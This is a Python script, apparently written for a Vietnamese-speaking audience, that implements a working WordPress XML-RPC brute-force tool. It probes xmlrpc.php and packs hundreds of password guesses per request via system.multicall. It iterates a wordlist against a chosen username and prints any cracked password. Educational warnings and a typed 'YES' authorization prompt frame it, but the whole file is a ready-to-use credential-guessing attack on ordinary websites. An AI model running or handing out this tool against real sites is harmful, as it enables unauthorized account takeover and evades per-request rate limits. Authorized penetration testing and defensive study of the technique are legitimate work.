#!/usr/bin/env python3
"""
WordPress XML-RPC Brute Force Tool
===================================
CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP VÀ PENTESTING CÓ AUTHORIZATION!

Sử dụng:
    python wp_xmlrpc_bruteforce.py -u <URL> -U <username> -P <wordlist>

Ví dụ:
    python wp_xmlrpc_bruteforce.py -u http://localhost:8080 -U admin -P rockyou.txt
    python wp_xmlrpc_bruteforce.py -u http://localhost:8080 -U admin -P rockyou.txt --chunk-size 100
"""

import argparse
import requests
import sys
import time
from typing import Optional
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║  ⚠️  CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP!              ║
║  Sử dụng tool này trên website không có authorization là      ║
║  BẤT HỢP PHÁP và có thể bị truy tố theo pháp luật.            ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║     WordPress XML-RPC Brute Force Tool (Educational)          ║
║                    Author: Security Lab                        ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def check_xmlrpc(url: str) -> bool:
    """Kiểm tra xem XML-RPC có enabled không"""
    xmlrpc_url = f"{url.rstrip('/')}/xmlrpc.php"

    payload = """<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
</methodCall>"""

    try:
        response = requests.post(xmlrpc_url, data=payload, timeout=10, verify=False)
        if 'system.multicall' in response.text:
            print(f"{Colors.GREEN}[+] XML-RPC enabled với system.multicall{Colors.RESET}")
            return True
        elif 'methodResponse' in response.text:
            print(f"{Colors.YELLOW}[!] XML-RPC enabled nhưng multicall có thể bị disable{Colors.RESET}")
            return True
        else:
            print(f"{Colors.RED}[-] XML-RPC bị disable hoặc không tồn tại{Colors.RESET}")
            return False
    except Exception as e:
        print(f"{Colors.RED}[-] Lỗi kết nối: {e}{Colors.RESET}")
        return False


def generate_multicall_payload(username: str, passwords: list) -> str:
    """Tạo XML payload cho system.multicall với nhiều passwords"""

    xml_header = """<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>"""

    xml_footer = """
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>"""

    xml_body = ""
    for pwd in passwords:
        # Escape special XML characters
        pwd_escaped = pwd.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        xml_body += f"""
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>wp.getUsersBlogs</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>{username}</string></value>
                                                <value><string>{pwd_escaped}</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>"""

    return xml_header + xml_body + xml_footer


def try_passwords(url: str, username: str, passwords: list) -> Optional[str]:
    """Thử một batch passwords, trả về password đúng nếu tìm thấy"""

    xmlrpc_url = f"{url.rstrip('/')}/xmlrpc.php"
    payload = generate_multicall_payload(username, passwords)

    try:
        response = requests.post(xmlrpc_url, data=payload.encode('utf-8'),
                                 timeout=30, verify=False,
                                 headers={'Content-Type': 'text/xml'})

        # Parse response để tìm password đúng
        # Nếu password đúng, response sẽ chứa blogid thay vì faultCode
        if 'isAdmin' in response.text or 'blogid' in response.text:
            # Tìm password đúng bằng cách thử từng cái
            for pwd in passwords:
                single_payload = generate_multicall_payload(username, [pwd])
                single_response = requests.post(xmlrpc_url, data=single_payload.encode('utf-8'),
                                               timeout=10, verify=False,
                                               headers={'Content-Type': 'text/xml'})
                if 'isAdmin' in single_response.text or 'blogid' in single_response.text:
                    return pwd

        return None

    except requests.exceptions.Timeout:
        print(f"{Colors.YELLOW}[!] Timeout - server có thể đang rate limit{Colors.RESET}")
        return None
    except Exception as e:
        print(f"{Colors.RED}[-] Lỗi: {e}{Colors.RESET}")
        return None


def load_wordlist(filepath: str, limit: int = 0) -> list:
    """Load wordlist từ file"""
    passwords = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f):
                if limit > 0 and i >= limit:
                    break
                pwd = line.strip()
                if pwd:
                    passwords.append(pwd)
        return passwords
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Không tìm thấy file: {filepath}{Colors.RESET}")
        sys.exit(1)


def brute_force(url: str, username: str, wordlist_path: str,
                chunk_size: int = 500, limit: int = 0, delay: float = 0.5):
    """Thực hiện brute force attack"""

    print(f"\n{Colors.BLUE}[*] Target: {url}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Username: {username}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Wordlist: {wordlist_path}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Chunk size: {chunk_size}{Colors.RESET}")

    # Kiểm tra XML-RPC
    print(f"\n{Colors.CYAN}[*] Kiểm tra XML-RPC...{Colors.RESET}")
    if not check_xmlrpc(url):
        print(f"{Colors.RED}[-] Không thể tiếp tục - XML-RPC không khả dụng{Colors.RESET}")
        return

    # Load wordlist
    print(f"\n{Colors.CYAN}[*] Đang load wordlist...{Colors.RESET}")
    passwords = load_wordlist(wordlist_path, limit)
    total_passwords = len(passwords)
    print(f"{Colors.GREEN}[+] Đã load {total_passwords:,} passwords{Colors.RESET}")

    # Chia thành chunks
    chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]
    total_chunks = len(chunks)

    print(f"\n{Colors.CYAN}[*] Bắt đầu brute force ({total_chunks} chunks)...{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Nhấn Ctrl+C để dừng{Colors.RESET}\n")

    start_time = time.time()
    tried = 0

    try:
        for i, chunk in enumerate(chunks):
            tried += len(chunk)
            progress = (tried / total_passwords) * 100
            elapsed = time.time() - start_time
            speed = tried / elapsed if elapsed > 0 else 0

            print(f"\r{Colors.CYAN}[*] Progress: {tried:,}/{total_passwords:,} ({progress:.1f}%) | "
                  f"Speed: {speed:.0f} pwd/s | "
                  f"Chunk {i+1}/{total_chunks}{Colors.RESET}", end='')

            result = try_passwords(url, username, chunk)

            if result:
                print(f"\n\n{Colors.GREEN}{Colors.BOLD}")
                print("╔═══════════════════════════════════════════════════════════════╗")
                print("║                    🎉 PASSWORD FOUND! 🎉                       ║")
                print("╠═══════════════════════════════════════════════════════════════╣")
                print(f"║  Username: {username:<50} ║")
                print(f"║  Password: {result:<50} ║")
                print("╚═══════════════════════════════════════════════════════════════╝")
                print(f"{Colors.RESET}")
                return result

            # Delay giữa các requests
            time.sleep(delay)

    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Đã dừng bởi người dùng{Colors.RESET}")
        return None

    print(f"\n\n{Colors.RED}[-] Không tìm thấy password trong wordlist{Colors.RESET}")
    elapsed = time.time() - start_time
    print(f"{Colors.BLUE}[*] Thời gian: {elapsed:.1f}s | Đã thử: {tried:,} passwords{Colors.RESET}")

    return None


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC Brute Force Tool (Educational)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ví dụ:
  python wp_xmlrpc_bruteforce.py -u http://localhost:8080 -U admin -P wordlist.txt
  python wp_xmlrpc_bruteforce.py -u http://localhost:8080 -U admin -P rockyou.txt --limit 1000
  python wp_xmlrpc_bruteforce.py -u http://localhost:8080 -U admin -P rockyou.txt --chunk-size 100

⚠️  CHỈ SỬ DỤNG TRÊN HỆ THỐNG BẠN CÓ QUYỀN KIỂM TRA!
        """
    )

    parser.add_argument('-u', '--url', required=True,
                        help='URL của WordPress site (vd: http://localhost:8080)')
    parser.add_argument('-U', '--username', required=True,
                        help='Username để brute force')
    parser.add_argument('-P', '--wordlist', required=True,
                        help='Đường dẫn đến wordlist file')
    parser.add_argument('--chunk-size', type=int, default=500,
                        help='Số passwords mỗi request (default: 500)')
    parser.add_argument('--limit', type=int, default=0,
                        help='Giới hạn số passwords để thử (0 = không giới hạn)')
    parser.add_argument('--delay', type=float, default=0.5,
                        help='Delay giữa các requests (seconds, default: 0.5)')

    args = parser.parse_args()

    # Yêu cầu xác nhận
    print(f"{Colors.YELLOW}")
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║  BẠN CÓ QUYỀN KIỂM TRA BẢO MẬT TRÊN WEBSITE NÀY KHÔNG?       ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print(f"{Colors.RESET}")

    confirm = input(f"{Colors.CYAN}Nhập 'YES' để xác nhận: {Colors.RESET}").strip()

    if confirm != 'YES':
        print(f"{Colors.RED}[-] Đã hủy. Cần xác nhận 'YES' để tiếp tục.{Colors.RESET}")
        sys.exit(0)

    # Chạy brute force
    brute_force(
        url=args.url,
        username=args.username,
        wordlist_path=args.wordlist,
        chunk_size=args.chunk_size,
        limit=args.limit,
        delay=args.delay
    )


if __name__ == '__main__':
    main()
